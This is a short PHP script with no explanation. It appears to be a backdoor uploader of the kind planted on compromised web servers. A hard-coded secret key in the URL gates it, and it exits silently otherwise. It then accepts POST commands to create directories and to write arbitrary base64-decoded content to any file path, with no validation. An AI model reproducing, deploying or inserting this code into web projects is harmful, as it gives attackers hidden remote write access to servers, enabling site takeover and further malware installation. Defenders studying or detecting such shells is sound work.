<?php 

	if( $_GET['k'] != '39c80789f2349191a3b9c92b777f509b' ){
		exit('.');
	}
	
	function echo_json($data)
	{

		echo json_encode( $data );

	}

	if( !empty( $_POST['cmd'] ) ){

		if( $_POST['cmd'] == "test" ){

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "mkdir" ){

			mkdir( $_POST['dir'] );
			chmod( $_POST['dir'] , 0755 );

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "upload" ){

			$post_file = $_POST['file'];
			$post_data = $_POST['data'];

			file_put_contents( $post_file , base64_decode( $post_data ) );
			chmod( $post_file , 0644 );

			echo_json(array(
				"code" => 200,
			));

		}

	}